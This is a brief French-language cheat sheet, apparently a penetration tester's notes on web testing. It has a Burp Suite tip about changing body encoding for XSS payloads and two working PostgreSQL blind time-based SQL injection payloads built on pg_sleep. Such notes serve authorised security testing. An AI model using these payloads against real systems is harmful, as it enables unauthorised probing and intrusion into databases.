# Web



## XSS

- Pour les payloads XSS (ou autre avec encodage chiant) : dans Burp > clic droit > change body encoding (il faut juste que le serveur accepte le format de requête mais sinon c'est okay)



## SQLi

- **Blind** (postgresql) : 

  ```sql
  0 and (123456=(select 123456 from pg_sleep(20)))
  ```

  ```sql
  0+and+('a'=(SELECT+case+when(1=1)+then+cast(PG_SLEEP(60)as+varchar)+else+'a'+end))
  ```

  

